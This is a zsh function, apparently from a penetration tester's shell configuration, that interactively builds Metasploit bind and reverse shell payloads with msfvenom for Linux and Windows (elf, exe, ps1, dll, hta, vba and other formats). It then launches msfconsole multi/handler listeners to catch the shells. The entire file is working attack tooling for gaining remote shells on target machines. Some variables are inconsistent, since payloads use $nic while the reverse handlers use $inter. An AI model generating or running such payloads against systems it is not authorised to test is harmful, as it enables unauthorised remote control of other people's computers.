metash(){
    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ ^lin* ]]; then
        read -r form\?"SELECT FORMAT (elf, elf-so): "
    fi
    if [[ $os =~ ^win* ]]; then
        read -r form\?"SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
    fi

    ext_form=$form
    if [[ $form == "ps1" ]]; then
        form="psh"
        ext_form="ps1"
    fi

    read -r type\?"SELECT STAGING: (staged / stageless): "
    read -r lis\?"SELECT CONNECTION (bind / reverse): "
    chnic
    read -r port\?"LISTENER PORT: "

    if [[ $os =~ ^lin* ]]; then
        if [[ $os == "lin32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi

            if [[ $type == "stageless" ]]; then 
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "lin64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
    fi

    if [[ $os =~ ^win* ]]; then
        if [[ $os == "win64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "win32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\nGENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\nOPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
                fi
            fi
        fi
    fi
}
